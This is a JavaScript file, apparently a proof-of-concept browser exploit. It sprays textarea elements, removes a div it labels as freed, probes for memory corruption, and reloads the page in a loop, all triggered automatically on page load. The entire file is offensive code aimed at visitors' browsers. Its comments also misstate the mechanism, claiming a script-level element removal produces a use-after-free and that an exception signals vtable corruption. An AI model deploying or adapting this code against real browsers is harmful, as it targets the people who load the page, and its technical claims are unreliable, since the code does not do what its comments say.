
function log(msg) {
  document.getElementById('status').textContent = msg;
}

function sprayTextareas(count) {
  let sprays = [];
  for (let i = 0; i < count; i++) {
    let ta = document.createElement('textarea');
    ta.value = "AAAAAAAA";
    sprays.push(ta);
    document.body.appendChild(ta);
  }
  return sprays;
}

function triggerUAF(callback) {
  let victim = document.createElement('div');
  victim.style.contentVisibility = 'auto';
  document.body.appendChild(victim);
  document.body.offsetHeight; // Force layout
  victim.remove(); // Free it
  callback(victim); // Use-after-free
}

function tryCorruptAccess(obj) {
  try {
    let x = obj.selectionStart;
    return false; // No crash, no corruption
  } catch (e) {
    return true; // Exception likely means corrupted vtable access
  }
}

function attemptExploit() {
  const sprays = sprayTextareas(1000);
  triggerUAF((uaf_obj) => {
    let corrupted = false;

    for (let i = 0; i < sprays.length; i++) {
      if (tryCorruptAccess(sprays[i])) {
        corrupted = true;
        break;
      }
    }

    if (corrupted) {
      log("💥 Corruption detected");
    } else {
      log("❌ No corruption. Retrying...");
      setTimeout(() => location.reload(), 2000);
    }
  });
}

window.onload = attemptExploit;
